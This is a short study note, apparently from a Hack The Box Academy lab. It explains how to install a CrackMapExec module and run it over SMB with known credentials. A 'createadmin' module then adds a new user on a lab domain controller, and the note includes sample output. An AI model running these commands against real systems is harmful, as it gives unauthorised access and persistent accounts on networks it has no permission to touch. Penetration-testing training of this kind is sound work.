# CMEmodule

**notes from HTB https://academy.hackthebox.com/module/84/section/817**

It is crucial to compile the CME project using Poetry (https://python-poetry.org/), which is recommended when building projects.

See this section for how to start using Poetry to run CrackMapExec - https://academy.hackthebox.com/module/84/section/797

Once CME has been installed with Poetry, copy the module's pythone file into the ./CrackMapExec/cme/modules folder.

The module can then be ran with or without options.

```shell
crackmapexec smb $IP -u $USER -p $PASS -M createadmin #Or whatever the module is called
```

For the example `createadmin.py`, it can be run by passing values to the user and password paramters

```shell
crackmapexec smb $IP -u $USER -p $PASS -M createadmin -o USER=htb PASS=Newpassword!
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121  445    DC01             [*] Creating user with the following values: USER htb and PASS Newpassword!
CREATEAD... 10.129.203.121  445    DC01             [*] Executing command
CREATEAD... 10.129.203.121  445    DC01             The command completed successfully.

The command completed successfully.
```